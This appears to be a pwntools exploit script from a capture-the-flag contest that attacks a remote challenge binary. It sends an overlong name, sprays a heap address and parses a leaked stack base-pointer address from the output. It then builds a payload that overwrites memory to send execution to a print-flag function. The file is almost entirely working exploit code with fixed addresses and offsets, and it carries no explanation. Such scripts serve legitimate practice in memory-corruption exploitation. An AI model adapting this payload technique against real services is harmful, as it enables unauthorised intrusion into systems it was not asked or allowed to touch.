from pwn import *
import re
import time

#p = process('online')
p = remote('challenges.auctf.com', 30013)



#set name
print p.recvrepeat(0.2)
p.sendline('test'*100)


#into class_hacker
print p.recvrepeat(0.2)
p.sendline('attend Hacker')
print p.recvrepeat(0.2)
addr_heap = 0x565745b0
#raw_input('Waiting for debugging : ' + str(p.pid))
p.sendline('dumm'+p32(addr_heap)*(0x808/4))

#p.interactive()


#get addr_ebp
time.sleep(1)

data = p.recvrepeat(0.2)
print data
pt = re.compile('0x[0-9a-f]{7,8}')
addr_ebp = pt.findall(data)[0]
print 'get address of ebp : ' + addr_ebp
addr_ebp = int(addr_ebp, 16)


#into class_hacker
print p.recvrepeat(0.2)
p.sendline('attend Hacker')
print p.recvrepeat(0.2)


#send payload(test goto main)
size_toEBP = 0x808
offset_overwrite = 0x10 - 8
offset_dest =  0xc - 8
addr_ret = addr_ebp + 4
addr_printFlag = 0x56556299

#raw_input('Waiting for debugging : ' + str(p.pid))
p.sendline('a'*(size_toEBP-offset_overwrite)+p32(addr_printFlag)+p32(addr_ret))

p.interactive()

